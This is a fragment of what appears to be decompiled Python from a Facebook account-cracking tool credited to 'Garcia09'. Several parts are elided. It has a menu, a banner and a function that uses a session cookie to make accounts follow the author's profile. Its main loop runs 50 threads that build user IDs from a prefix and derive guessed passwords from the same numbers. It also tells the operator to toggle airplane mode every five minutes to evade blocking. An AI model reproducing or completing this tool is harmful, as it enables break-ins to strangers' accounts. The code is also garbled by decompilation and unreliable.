...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-https://www.facebook.com/profile.php?id=100088085461434')
        return None
    if None == '3':
        os.system('xdg-https://www.facebook.com/groups/1148797432715185/?ref=share_group_link ')
        return None
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100088085461434', {
...
\033[1;37m================= \33[32;45mGarcia\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mGarcia09
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Garcja09
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m Mr g
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;31m USE AIRPLANE MOOD IN EVERY 5 MIN ')
        print('\033[1;32m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
